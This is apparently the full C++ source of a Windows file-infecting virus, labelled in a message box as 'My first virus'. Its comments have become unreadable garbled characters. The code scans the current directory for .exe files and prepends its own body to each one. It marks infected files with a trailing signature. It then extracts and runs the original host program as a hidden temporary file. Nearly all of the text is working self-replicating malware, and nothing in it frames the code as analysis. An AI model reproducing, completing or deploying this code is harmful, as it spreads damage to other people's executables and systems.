#include <Windows.h>

#pragma comment(linker,"/MERGE:.rdata=.text")
#pragma comment(linker,"/FILEALIGN:512")
#pragma comment(linker,"/SECTION:.text,EWR /IGNORE:4078")
#pragma comment(linker,"/ENTRY:main")

wchar_t* CharToWchar(char*);
char* WcharToChar(wchar_t*);
bool FindFiles(int, HANDLE);
bool Infection(int, wchar_t*, HANDLE);
int WcsCat(wchar_t *, wchar_t *);
bool BufExe(HANDLE);
bool ChooseGen();
bool Infect1Gen(HANDLE, HANDLE);
bool Infect2Gen(HANDLE, HANDLE);

/**
Buffer for infection file
*/
unsigned char bufPat[80241024];
/**
Buffer for virus
*/
unsigned char bufVir[60024];

int main(int argc, char *argv[])
{
	if(!ChooseGen()) return 0; // �������� �� ���������
	return 1;	
}
/**
Forms generation
*/
bool ChooseGen()
{
	wchar_t b[MAX_PATH];
	DWORD signature, w;
	HANDLE hfPat;

	GetModuleFileName(NULL, b, MAX_PATH);	// ��������� ������� ���� � �������� �����
	hfPat = CreateFile(b, 0x80000000, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0); // �������� ����� ��� ������
	if((DWORD)hfPat == 0xffffffff) 
	{
		CloseHandle(hfPat); 
		return false; 
	}
	SetFilePointer(hfPat,-sizeof(DWORD),0,2);	// ��������� ��������� �� ����� � �����, ��� ������ ���� ���������
	ReadFile(hfPat,&signature, sizeof(DWORD), &w, NULL); // ������ ���������
	
	if(signature == 0x4567)	// �������� ���������		
	{
		FindFiles(2, hfPat);	// ����� ������� ������ ������ � ������� ����������
		MessageBox(0,CharToWchar("virus"),CharToWchar("My first virus"),0);    // ����� ��������� � ���������
		if(!BufExe(hfPat)) return false;	// ������� �������� � ���������� ��������� ���
	}
	else
	{
		FindFiles(1, hfPat);
	}
	CloseHandle(hfPat);
	return true;
}

/**
Converts string from ANSI to UNICODE
@param temp string in ANSI code
@return string in UNICODE
*/
wchar_t* CharToWchar(char *temp)
{
	int len = 0;
	while(temp[len])	// ���� ������������ ����� ������
		len++;
	wchar_t *wStr = new wchar_t[len + 1];
	MultiByteToWideChar(0, NULL, temp, -1, wStr, len);	//������� �������������� 
	wStr[len] = 0;
	return wStr;
}

/**
Converts string from UNICODE to ANSII
@param temp string in UNICODE
@return string in ANSI code
*/
char* WcharToChar(wchar_t *temp)
{
	int len = 0;
	while(temp[len])	// ���� ������������ ����� ������
		len++;
	char *Str = new char[len + 1];
	WideCharToMultiByte(1251, NULL, temp, -1, Str, len, NULL, NULL);	// ������� ��������������
	Str[len] = '\0';
	return Str;
}

/**
Searches files in current directory
@param gen generation of carrier
@param hPat HANDLE of carrier
*/
bool FindFiles(int gen, HANDLE hPat)
{
	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = NULL;
    wchar_t DirSpec[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, DirSpec);	// ��������� ������� ����������
    WcsCat(DirSpec, CharToWchar("\\*.exe"));	// ������������� ����� ������

    hFind = FindFirstFile(DirSpec, &FindFileData);	// ����� �������� ����� � ������� ���������� �� �����

	
    if (hFind == INVALID_HANDLE_VALUE) 
    {
       return false;
    } 
    else 
    {	
		Infection(gen, FindFileData.cFileName, hPat);	//����� ������ ������� ��������� �����
		while (FindNextFile(hFind, &FindFileData) != 0)		//���� ������ ���� ���������� ������
		{
			Infection(gen, FindFileData.cFileName, hPat);	// ����� ������� ��������� �����
		}
    FindClose(hFind);
    }
    return true;
}

/**
Choose infection way
@param gen generation of carrier
@param name string containing name of file
@param hSource HANDLE of carrier
*/
bool Infection(int gen, wchar_t *name, HANDLE hSource)
{
	if(!wcscmp(name,CharToWchar("Vir_var2.exe")))	// �������� �� ������ ����
	{
		return true;
	}
	DWORD w, signature;
	wchar_t DirSpec[MAX_PATH];  
	GetCurrentDirectory(MAX_PATH, DirSpec);	
	WcsCat(DirSpec, CharToWchar("\\"));
	WcsCat(DirSpec, name);

	HANDLE hfPat = CreateFile(DirSpec, 0xC0000000, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);	// �������� �����, ���������� ��� ���������
	if((DWORD)hfPat == 0xffffffff) 
	{
		CloseHandle(hfPat); 
		return false; 
	}
	SetFilePointer(hfPat, -sizeof(DWORD), 0, 2);
	ReadFile(hfPat, &signature, sizeof(DWORD), &w, NULL);

	if(signature == 0x4567) return false;	// �������� �� ��������� ���������
	
	// Infection
	if(gen == 2) Infect2Gen(hSource, hfPat);	// ����� ������� ��������� ������� ���������
	else Infect1Gen(hSource, hfPat);		// ����� ������� ������� ���������

	SetFilePointer(hfPat, 0, 0, 2);	// ��������� ���������� �� ����� ����������� �����
	signature = 0x4567;	// ���������
	WriteFile(hfPat,&signature, sizeof(DWORD), &w, NULL);	// ������ ��������� � ����� �����

	CloseHandle(hfPat);
}

/**
Infection 1 generation
@param hSource HANDLE of carrier
@param hPat HANDLE of target file
*/
bool Infect1Gen(HANDLE hSource, HANDLE hPat)
{
	DWORD vir_sz = 0, wr, i;
	vir_sz = SetFilePointer(hSource, 0, 0, 2); // ��������� ������� ������
		// vnedrenie
	SetFilePointer(hPat, 0, 0, 0); //��������� ���������� � ������ �� ������
	SetFilePointer(hSource, 0, 0, 0);

	unsigned char buf[1024];
	i=0;
	while(1)	// ���� ������ � ����� ���� ����������� �����
	{
		ReadFile(hPat,&bufPat[i], 1024, &wr, NULL);
		i += wr;
		if(wr < 1024) break;
	};

	SetFilePointer(hPat, 0, 0, 0);

	while(1)	// ���� ������ ���� ������ � ��������� ����
	{
		ReadFile(hSource,buf, 1024, &wr, NULL);
		WriteFile(hPat, buf, wr, &wr, NULL);
		if(wr < 1024) break;
	};
	WriteFile(hPat, bufPat, i, &i, NULL);	// ������ ���� ��������� ����� �� ����� ������
	SetFilePointer(hPat, 0, 0, 2);
	WriteFile(hPat, &vir_sz, sizeof(vir_sz), &wr, NULL);	// ������ � ����� ����� ������ ������
	return true;
}

/**
Infection 2 generation
@param hSource HANDLE of carrier
@param hPat HANDLE of target file
*/
bool Infect2Gen(HANDLE hSource, HANDLE hPat)
{
	DWORD r, vir_sz, i;
	SetFilePointer(hSource, -2*sizeof(vir_sz), 0, 2);	// ��������� ��������� �� �� �����, ��� ��������� ������ ������
	ReadFile(hSource, &vir_sz, sizeof(vir_sz), &r, NULL);	//������ ������� ������
												
	SetFilePointer(hSource, 0, 0, 0);
	unsigned char buf[1024];
	ReadFile(hSource,bufVir, vir_sz, &r, NULL);	// ������ ���� ����� � ������
	SetFilePointer(hPat, 0, 0, 0);
	i=0;
	while(1)	// ������ ���� ����������� ����� � ������
	{
		ReadFile(hPat,&bufPat[i], 1024, &r, NULL);
		i += r;
		if(r < 1024) break;
	};

	SetFilePointer(hPat, 0, 0, 0);
	WriteFile(hPat, bufVir, vir_sz, &r, NULL);	// ������ ���� ������
	WriteFile(hPat, bufPat, i, &i, NULL);	// ������ ���� �����
	WriteFile(hPat, &vir_sz, sizeof(vir_sz), &r, NULL);	// ������ ������� ������
	return true;
}

/**
Create and execute temp file
@param hSource HANDLE of carrier
*/
bool BufExe(HANDLE hFile)
{
	DWORD r = 0, vir_sz = 0;
	wchar_t DirSpec[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, DirSpec);
	WcsCat(DirSpec, CharToWchar("\\ahaha.exe"));	// ��������� ����� ���������� �����

	SetFilePointer(hFile, -2*sizeof(vir_sz), 0, 2);	
	ReadFile(hFile, &vir_sz, sizeof(vir_sz), &r, NULL);
												
	SetFilePointer(hFile, vir_sz, 0, 0);
	HANDLE hfPat2 = CreateFile(DirSpec, 0xC0000000, 0x00000001, NULL, 2, FILE_ATTRIBUTE_HIDDEN, 0);	// �������� ���������� ����� � ��������� �������
	if((DWORD)hfPat2 == 0xffffffff) 
	{
		CloseHandle(hfPat2); 
		return false; 
	}

	unsigned char buf[1024];
	while(1)	// ����������� ���� ����������� ����� ��� ���� ������ � ������
	{
		ReadFile(hFile,buf, 1024, &r, NULL);
		WriteFile(hfPat2, buf, r, &r, NULL);
		if(r < 1024) break;
	};											
	CloseHandle(hfPat2);
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	GetStartupInfo(&si);	// ��������� ����������� ���������
	if(!CreateProcess(DirSpec,NULL,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi)) return false;	// �������� �������� ��� ���������� �����
	HANDLE proc = pi.hProcess;
	WaitForSingleObject(proc, INFINITE);	// �������� ���������� ��������											
	DeleteFile(DirSpec);	// �������� ���������� �����
	return true;
}

/**
Connection two strings
@param dest string in UNICODE
@param source string in UNICODE
*/
int WcsCat(wchar_t *dest, wchar_t *source)
{
	int i= 0, j = 0;
	while(dest[i]) i++;
	while(source[j]) {dest[i] = source[j]; j++; i++;}
	dest[i] = 0;
	return 1;
}